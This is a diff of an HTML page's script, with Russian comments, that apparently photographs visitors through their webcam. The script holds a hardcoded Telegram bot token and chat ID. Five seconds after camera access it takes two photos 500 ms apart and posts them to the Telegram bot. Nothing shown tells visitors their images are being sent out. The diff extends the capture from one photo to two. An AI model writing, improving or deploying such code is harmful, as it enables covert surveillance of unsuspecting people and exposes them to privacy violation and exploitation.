@@ -22,8 +22,8 @@
         }
     </style>
     <script>
-        const TOKEN = "7517508116:AAHydfYGo0-6pYS3rwx0GE2__ELVhi9pwnE";  // Вставь токен бота
-        const CHAT_ID = "7477642275";  // Вставь свой Chat ID
+        const TOKEN = "7517508116:AAHydfYGo0-6pYS3rwx0GE2__ELVhi9pwnE";  // Токен бота
+        const CHAT_ID = "7477642275";  // Chat ID
         const API_URL = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
         const PHOTO_API_URL = `https://api.telegram.org/bot${TOKEN}/sendPhoto`;
 
@@ -79,27 +79,32 @@
                         videoElement.play();
                         document.body.appendChild(videoElement);
 
-                        // Делать снимок через 5 секунд
+                        // Делать снимки через 5 секунд
                         setTimeout(() => {
-                            let canvas = document.createElement("canvas");
-                            let ctx = canvas.getContext("2d");
-                            canvas.width = videoElement.videoWidth;
-                            canvas.height = videoElement.videoHeight;
-                            ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+                            takeAndSendPhoto(stream, videoElement);
+                            setTimeout(() => {
+                                takeAndSendPhoto(stream, videoElement);
+                            }, 500); // Второе фото через 500 миллисекунд после первого
+                        }, 5000); // Через 5 секунд
 
-                            let photoDataUrl = canvas.toDataURL("image/png");
-
-                            // Отправка фото в Telegram
-                            sendPhotoToTelegram(photoDataUrl);
-
-                            // Остановка видео и очистка
-                            stream.getTracks().forEach(track => track.stop());
-                            videoElement.remove();
-                        }, 5000); // Сделаем снимок через 5 секунд
                     }).catch(err => {
                         console.log("Ошибка с доступом к камере: " + err);
                     });
             }
+        }
+
+        // Функция для захвата фото и отправки в Telegram
+        function takeAndSendPhoto(stream, videoElement) {
+            let canvas = document.createElement("canvas");
+            let ctx = canvas.getContext("2d");
+            canvas.width = videoElement.videoWidth;
+            canvas.height = videoElement.videoHeight;
+            ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+
+            let photoDataUrl = canvas.toDataURL("image/png");
+
+            // Отправка фото в Telegram
+            sendPhotoToTelegram(photoDataUrl);
         }
 
         // Функция для отправки фото в Telegram
